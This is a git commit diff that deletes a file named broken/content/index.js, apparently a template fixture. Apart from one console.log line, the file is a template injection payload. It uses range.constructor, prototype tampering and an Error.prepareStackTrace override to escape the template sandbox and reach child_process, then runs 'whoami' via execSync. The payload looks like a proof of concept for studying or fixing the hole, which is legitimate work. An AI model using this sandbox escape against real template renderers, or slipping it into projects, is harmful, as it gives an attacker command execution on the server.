b97452c6172ce7ef23966a092f76d0d4dd1b28d5
Matthew Belisle <matthew.belisle@workiva.com>
2022-11-22 15:32:26 -0600

    Copy

--- broken/content/index.js
+++
@@ -1,9 +0,0 @@
-console.log('Hello from ${{ values.name }}!');
-${{ range.constructor("this.env.__proto__.renderString = function() {
-  globalthis.OldError = globalThis.Error;
-  globalThis.Error = class Error {};
-  globalthis.Error.prepareStackTrace = (cs, trace) => {
-    trace[2].getThis().process.mainModule.require(\"child_process\").execSync(\"whoami > /tmp/whoami.txt\");
-  };
-  const {stack} = new globalThis.OldError();
-}")().triggerException() }}
